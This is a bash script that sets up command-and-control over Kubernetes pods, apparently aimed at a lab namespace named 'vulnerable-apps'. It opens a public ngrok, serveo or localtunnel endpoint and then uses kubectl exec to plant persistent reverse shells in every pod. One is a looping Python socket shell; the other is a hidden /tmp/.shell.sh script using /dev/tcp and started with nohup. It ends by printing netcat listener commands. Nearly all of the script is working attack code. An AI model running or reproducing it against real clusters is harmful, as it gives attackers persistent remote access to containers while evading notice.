#!/bin/bash

# Script to establish a C2 (Command & Control) using ngrok or similar
# Allows access from outside AWS

set -e

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
BLUE='\033[0;34m'
NC='\033[0m'

NAMESPACE="${1:-vulnerable-apps}"
C2_PORT="${2:-4444}"
METHOD="${3:-ngrok}"  # ngrok, serveo, localtunnel

echo -e "${BLUE}=== Establishing C2 for Reverse Shells ===${NC}\n"

# Check if ngrok is available
if [ "$METHOD" = "ngrok" ]; then
    if ! command -v ngrok &> /dev/null; then
        echo -e "${YELLOW}ngrok is not installed${NC}"
        echo -e "${YELLOW}Installing ngrok...${NC}"
        
        # Install ngrok
        if [[ "$OSTYPE" == "darwin"* ]]; then
            brew install ngrok/ngrok/ngrok 2>/dev/null || {
                echo -e "${YELLOW}Manual installation required${NC}"
                echo "Download from: https://ngrok.com/download"
            }
        else
            curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
            echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list
            sudo apt update && sudo apt install ngrok
        fi
    fi
fi

# Get pods
PODS=$(kubectl get pods -n "$NAMESPACE" -o jsonpath='{.items[*].metadata.name}' 2>/dev/null || echo "")

if [ -z "$PODS" ]; then
    echo -e "${RED}No pods found${NC}"
    exit 1
fi

FIRST_POD=$(echo $PODS | cut -d' ' -f1)

# Start public tunnel
echo -e "${YELLOW}[1] Starting public tunnel ($METHOD)...${NC}"

case $METHOD in
    ngrok)
        # Start ngrok in background
        ngrok tcp $C2_PORT > /tmp/ngrok.log 2>&1 &
        NGROK_PID=$!
        sleep 3
        
        # Get public URL
        NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o 'tcp://[^"]*' | head -1 | sed 's/tcp://')
        
        if [ -z "$NGROK_URL" ]; then
            echo -e "${RED}✗ Could not get ngrok URL${NC}"
            kill $NGROK_PID 2>/dev/null || true
            exit 1
        fi
        
        PUBLIC_HOST=$(echo $NGROK_URL | cut -d':' -f1)
        PUBLIC_PORT=$(echo $NGROK_URL | cut -d':' -f2)
        
        echo -e "${GREEN}✓ ngrok tunnel established${NC}"
        echo -e "${GREEN}  Public URL: $PUBLIC_HOST:$PUBLIC_PORT${NC}"
        ;;
    serveo)
        # Use serveo.net (no installation required)
        echo -e "${YELLOW}Using serveo.net...${NC}"
        ssh -R 80:localhost:$C2_PORT serveo.net > /tmp/serveo.log 2>&1 &
        SERVEO_PID=$!
        sleep 3
        
        PUBLIC_HOST="serveo.net"
        PUBLIC_PORT="80"
        echo -e "${GREEN}✓ serveo tunnel established${NC}"
        ;;
    localtunnel)
        if ! command -v lt &> /dev/null; then
            npm install -g localtunnel
        fi
        lt --port $C2_PORT > /tmp/localtunnel.log 2>&1 &
        LT_PID=$!
        sleep 3
        
        LT_URL=$(grep -o 'https://[^ ]*' /tmp/localtunnel.log | head -1)
        PUBLIC_HOST=$(echo $LT_URL | sed 's|https://||' | cut -d'.' -f1)
        PUBLIC_PORT="443"
        echo -e "${GREEN}✓ localtunnel established${NC}"
        ;;
    *)
        echo -e "${RED}Unknown method: $METHOD${NC}"
        exit 1
        ;;
esac

# Establish reverse shells from pods
echo -e "\n${YELLOW}[2] Establishing reverse shells from pods...${NC}"

for POD in $PODS; do
    echo -e "${BLUE}  Configuring $POD...${NC}"
    
    # Method 1: Python persistent reverse shell
    kubectl exec -it "$POD" -n "$NAMESPACE" -- python3 -c "
import socket,subprocess,os,threading,time
def connect():
    while True:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(('$PUBLIC_HOST',$PUBLIC_PORT))
            os.dup2(s.fileno(),0)
            os.dup2(s.fileno(),1)
            os.dup2(s.fileno(),2)
            subprocess.call(['/bin/sh','-i'])
        except:
            time.sleep(10)
            continue
threading.Thread(target=connect,daemon=True).start()
" 2>/dev/null &
    
    # Method 2: Persistent script
    kubectl exec -it "$POD" -n "$NAMESPACE" -- sh -c "
cat > /tmp/.shell.sh <<'EOF'
#!/bin/sh
while true; do
    /bin/sh -i >& /dev/tcp/$PUBLIC_HOST/$PUBLIC_PORT 0>&1 2>/dev/null || sleep 10
done
EOF
chmod +x /tmp/.shell.sh
nohup /tmp/.shell.sh > /dev/null 2>&1 &
" 2>/dev/null
    
    echo -e "${GREEN}    ✓ Reverse shell configured${NC}"
done

echo -e "\n${GREEN}=== C2 Established ===${NC}"
echo -e "${YELLOW}Listen on your machine:${NC}"
echo -e "${GREEN}nc -lvp $C2_PORT${NC}"
echo -e "\n${YELLOW}Public URL: $PUBLIC_HOST:$PUBLIC_PORT${NC}"
echo -e "${YELLOW}Connect from anywhere:${NC}"
echo -e "${GREEN}nc $PUBLIC_HOST $PUBLIC_PORT${NC}"

# Keep script running
echo -e "\n${YELLOW}Press Ctrl+C to stop...${NC}"
trap "kill $NGROK_PID $SERVEO_PID $LT_PID 2>/dev/null; exit" INT TERM
wait
